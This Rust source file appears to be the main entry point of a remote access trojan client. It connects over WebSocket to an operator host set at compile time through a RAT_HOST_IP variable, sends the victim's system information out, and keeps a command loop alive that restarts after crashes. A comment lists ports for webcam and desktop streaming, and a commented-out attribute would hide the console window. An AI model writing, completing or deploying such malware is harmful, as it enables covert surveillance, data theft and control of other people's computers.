// #![windows_subsystem = "windows"]

use std::net::TcpStream;
use std::panic;
use std::str::FromStr;

use tungstenite::stream::MaybeTlsStream;
use tungstenite::{connect, WebSocket};

use crate::router::handle_message;
use crate::utils::SystemInformation;

mod handlers;
mod router;
mod utils;
pub type Socket = WebSocket<MaybeTlsStream<TcpStream>>;

/* Ports
4040 - Handling one-time messages
4043 - Webcam Streaming
4042 - Desktop Streaming
 */

#[derive(Clone)]
struct Connection {
    ip: String,
    port: i32,
}

fn main() {
    const HOST_IP: &str = env!("RAT_HOST_IP");
    const HOST_PORT: &str = env!("RAT_HOST_PORT");

    let connection = Connection {
        ip: HOST_IP.to_string(),
        port: i32::from_str(HOST_PORT).expect("Invalid port number provided at compile time"),
    };

    connect_with_host(connection);
}

fn connect_with_host(connection: Connection) {
    let (mut socket, _response) =
        connect(format!("ws://{}:{}", connection.ip, connection.port)).expect("Can't connect");
    let sysinfo = SystemInformation::get().to_string();
    socket.send(sysinfo.into()).unwrap();

    loop {
        let res = panic::catch_unwind(panic::AssertUnwindSafe(|| {
            read_messages(&mut socket, connection.clone())
        }));
        if res.is_err() {
            eprintln!("A panic was caught. Restarting the read loop.");
            std::thread::sleep(std::time::Duration::from_secs(1));
            continue;
        }
    }
}

fn read_messages(socket: &mut Socket, connection: Connection) -> anyhow::Result<()> {
    loop {
        let msg = socket.read();
        if let Ok(msg) = msg {
            let text = msg.into_text().unwrap();
            let bytes = text.as_bytes();
            _ = handle_message(bytes, socket, &connection);
        }
    }
}
